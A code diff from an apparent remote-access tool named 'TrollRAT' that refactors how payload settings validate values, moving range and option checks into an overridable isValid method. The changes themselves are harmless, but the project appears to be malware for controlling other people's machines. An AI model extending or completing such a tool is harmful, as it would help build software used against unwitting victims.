@@ -14,11 +14,24 @@ namespace TrollRAT.Payloads
     public abstract class PayloadSetting<t> : PayloadSetting
     {
         protected t value;
-        public t Value => value;
+        public t Value
+        {
+            get { return value; }
+            set
+            {
+                if (isValid(value))
+                    this.value = value;
+            }
+        }
 
         public PayloadSetting(t defaultValue) : base()
         {
             value = defaultValue;
+        }
+
+        public virtual bool isValid(t v)
+        {
+            return true;
         }
     }
 
@@ -60,11 +73,14 @@ namespace TrollRAT.Payloads
             try
             {
                 decimal i = decimal.Parse(str);
-
-                if (i <= max && i >= min)
-                    value = i;
+                Value = i;
             }
             catch (Exception) { }
+        }
+
+        public override bool isValid(decimal v)
+        {
+            return (v <= max && v >= min);
         }
     }
 
@@ -117,11 +133,14 @@ namespace TrollRAT.Payloads
             try
             {
                 int i = int.Parse(str);
-
-                if (i >= 0 && i < options.Length)
-                    value = i;
+                Value = i;
             }
             catch (Exception) { }
+        }
+
+        public override bool isValid(int v)
+        {
+            return (v >= 0 && v < options.Length);
         }
     }
 }
